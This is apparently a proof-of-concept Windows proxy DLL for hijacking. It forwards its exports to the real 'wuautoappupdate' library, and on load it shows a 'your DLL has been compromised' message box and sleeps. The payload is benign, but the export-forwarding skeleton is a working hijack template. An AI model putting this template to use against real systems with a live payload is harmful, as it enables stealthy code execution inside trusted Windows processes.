// dllmain.cpp : Defines the entry point for the DLL application.
#include "pch.h"

#include <Windows.h>
#pragma comment(lib, "user32.lib")

#pragma comment(linker, "/export:DllCanUnloadNow=wuautoappupdate.DllCanUnloadNow")
#pragma comment(linker, "/export:DllGetClassObject=wuautoappupdate.DllGetClassObject")
#pragma comment(linker, "/export:DllRegisterServer=wuautoappupdate.DllRegisterServer")
#pragma comment(linker, "/export:DllUnregisterServer=wuautoappupdate.DllUnregisterServer")

BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
                     )
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
    {
         MessageBoxA(NULL, "Hello your DLL has been compromised!", "HELLO", MB_ICONWARNING | MB_OK);
         OutputDebugString(L"HI");
         Sleep(50000);
    }
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}

